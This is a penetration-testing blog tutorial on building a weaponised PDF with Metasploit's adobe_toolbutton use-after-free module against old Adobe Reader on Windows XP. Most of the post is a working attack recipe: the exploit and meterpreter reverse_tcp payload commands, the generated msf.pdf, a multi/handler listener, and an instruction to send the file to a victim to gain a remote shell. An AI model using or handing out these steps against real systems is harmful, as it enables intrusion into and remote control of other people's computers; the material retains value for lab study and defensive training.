<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">Hack Remote PC Using Adobe Reader ToolButton Use After Free</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-remote-pc-using-adobe-reader-toolbutton-use-free/" rel="bookmark"><time class="entry-date published" datetime="2013-12-19T08:13:11+00:00">December 19, 2013</time><time class="updated" datetime="2025-05-27T12:05:08+00:00">May 27, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p style="text-align: justify;"><span style="color: #000000;">This module exploits an use after free condition on Adobe Reader versions 11.0.2, 10.1.6 and 9.5.4 and prior. The vulnerability exists while handling the ToolButton object, where the cEnable callback can be used to early free the object memory. Later use of the object allows triggering the use after free condition. This module has been tested successfully on Adobe Reader 11.0.2, 10.0.4 and 9.5.0 on Windows XP SP3, as exploited in the wild in November, 2013</span></p>
<h4 style="text-align: justify;"><span style="color: #000000;"><b>Exploit Targets</b></span></h4>
<p style="text-align: justify;"><span style="color: #000000;">Windows XP SP 3</span></p>
<p style="text-align: justify;"><span style="color: #000000;">Adobe Reader 11.0.2</span></p>
<p style="text-align: justify;"><span style="color: #000000;">Adobe Reader 10.1.6</span></p>
<p style="text-align: justify;"><span style="color: #000000;">Adobe Reader 9.5.4</span></p>
<h4 style="text-align: justify;"><span style="color: #000000;"><b>Requirement</b></span></h4>
<p style="text-align: justify;"><span style="color: #000000;"><b>Attacker</b>: Kali Linux</span></p>
<p style="text-align: justify;"><span style="color: #000000;"><b>Victim PC</b>: Windows XP</span></p>
<p style="text-align: justify;"><span style="color: #000000;">Open <b>Kali Linux</b> terminal typeÂ <b>msfconsole</b></span></p>
<p style="text-align: justify;"><img decoding="async" alt="" src="http://4.bp.blogspot.com/-QbGLvoZLOvE/UrAF3oEg0yI/AAAAAAAAHMk/DMR2FSbi85M/s1600/1.jpg"/></p>
<p style="text-align: justify;"><span style="color: #000000;">Now type <b>use exploit/windows/fileformat/adobe_toolbutton</b></span></p>
<p style="text-align: justify;"><span style="color: #000000;">msf exploit (<span style="color: #800000;"><b>adobe_toolbutton</b></span>)&gt;<b>set payload windows/meterpreter/reverse_tcp</b></span></p>
<p style="text-align: justify;"><span style="color: #000000;">msf exploit (<span style="color: #800000;"><b>adobe_toolbutton</b></span>)&gt;<b>set lhost 192.168.1.113 (</b>IP of Local Host)</span></p>
<p style="text-align: justify;"><span style="color: #000000;">msf exploit (<span style="color: #800000;"><b>adobe_toolbutton</b></span>)&gt;<b>exploit</b></span></p>
<p style="text-align: justify;"><img decoding="async" alt="" src="http://4.bp.blogspot.com/-FnxXxjnk158/UrAGBkKuvoI/AAAAAAAAHMs/Ff18pQN9TK4/s1600/2.jpg"/></p>
<p><span style="color: #000000;">After we successfully generate the malicious <b>pdf </b>File, it will stored on your local computer</span></p>
<p><span style="color: #000000;"><b>/root/.msf4/local/msf.pdf</b></span></p>
<p><img decoding="async" alt="" src="http://2.bp.blogspot.com/-NmJ51XuNZa0/UrAGIaTuMiI/AAAAAAAAHM0/MNsBssKbw84/s1600/3.jpg"/></p>
<p style="text-align: justify;"><span style="color: #000000;">Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.</span></p>
<p style="text-align: justify;"><span style="color: #000000;"><b>use exploit/multi/handler</b></span></p>
<p style="text-align: justify;"><span style="color: #000000;"><b>set payload windows/meterpreter/reverse_tcp</b></span></p>
<p style="text-align: justify;"><span style="color: #000000;"><b>set lhost 192.168.1.113</b></span></p>
<p style="text-align: justify;"><span style="color: #000000;"><b>exploit</b></span></p>
<p style="text-align: justify;"><span style="color: #000000;">Now send your <b>msf.pdf</b> files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer.</span></p>
<p style="text-align: justify;"><img decoding="async" alt="" src="http://1.bp.blogspot.com/-v6aHlFA72Qw/UrAGPQOqkFI/AAAAAAAAHM8/p5c4KU1-7pI/s1600/5.jpg"/></p>
<p style="text-align: justify;"><img decoding="async" alt="" src="http://4.bp.blogspot.com/-NzbAqU29-x4/UrAGTjQ6NMI/AAAAAAAAHNE/SOZ0vwcSR04/s1600/4.jpg"/></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
